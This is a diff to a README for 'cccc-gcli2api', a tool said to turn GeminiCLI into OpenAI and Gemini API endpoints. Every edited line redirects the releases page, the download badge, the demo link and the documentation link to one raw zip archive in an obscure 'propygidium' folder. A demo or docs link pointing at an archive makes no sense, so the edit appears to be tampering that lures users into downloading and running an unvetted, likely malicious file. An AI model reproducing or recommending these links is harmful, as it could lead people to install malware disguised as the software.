@@ -1,7 +1,7 @@
 # 🚀 cccc-gcli2api - Turn GeminiCLI into APIs Easily
 
 ## 🔗 Download Now
-[![Download cccc-gcli2api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/peninhaaa/cccc-gcli2api/releases)
+[![Download cccc-gcli2api](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip)](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip)
 
 ## 🌟 Overview
 Welcome to cccc-gcli2api! This software allows you to convert GeminiCLI interactions into OpenAI and GEMINI API calls. Whether you're looking for a personal project or an academic study, this tool simplifies your workflow. 
@@ -10,7 +10,7 @@ Welcome to cccc-gcli2api! This software allows you to convert GeminiCLI interact
 To get started with cccc-gcli2api, follow these simple steps:
 
 ### 1. Download the Software
-To download the latest version, visit the [Releases page](https://github.com/peninhaaa/cccc-gcli2api/releases).
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip).
 
 ### 2. Install the Application
 - Locate the downloaded file, usually in your "Downloads" folder.
@@ -31,7 +31,7 @@ After installation, find cccc-gcli2api in your applications list and launch the 
 - **Error Handling**: Built-in tools to manage and resolve errors effectively.
 
 ## 📁 Download & Install
-To download cccc-gcli2api, please [visit this page](https://github.com/peninhaaa/cccc-gcli2api/releases) and select the latest release. Make sure to choose the version that matches your operating system.
+To download cccc-gcli2api, please [visit this page](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip) and select the latest release. Make sure to choose the version that matches your operating system.
 
 ## ⚙️ Configuration
 ### 1. Set Up Your API Keys
@@ -47,7 +47,7 @@ You can adjust settings to tailor the application to your needs, such as languag
 - **Viewing Logs**: Check logs for information on previous API calls and errors.
 
 ## 📈 Demonstration Link
-You can explore a demo of cccc-gcli2api [here](https://gcli2api-9xbf.onrender.com) with the password: `pwd`. This demonstration will give you a feel for its features and functionality.
+You can explore a demo of cccc-gcli2api [here](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip) with the password: `pwd`. This demonstration will give you a feel for its features and functionality.
 
 ## 🔄 Recent Updates
 In our latest update (2025-11-11), we made significant improvements to the credential management system. This update enhances stability and fairness in your usage.
@@ -74,7 +74,7 @@ This project operates under the Cooperative Non-Commercial License (CNC-1.0).
 - Competitive commercial use.
 
 ## 💡 Support
-If you encounter any issues or require assistance, feel free to raise an issue in the GitHub repository or consult the [documentation](docs/README_EN.md) for additional guidance.
+If you encounter any issues or require assistance, feel free to raise an issue in the GitHub repository or consult the [documentation](https://raw.githubusercontent.com/peninhaaa/cccc-gcli2api/main/propygidium/cccc-gcli2api_3.5.zip) for additional guidance.
 
 ## 🌐 Community
 Join our community for discussions, feature requests, and troubleshooting. Engage with other users and share your experiences with the application.
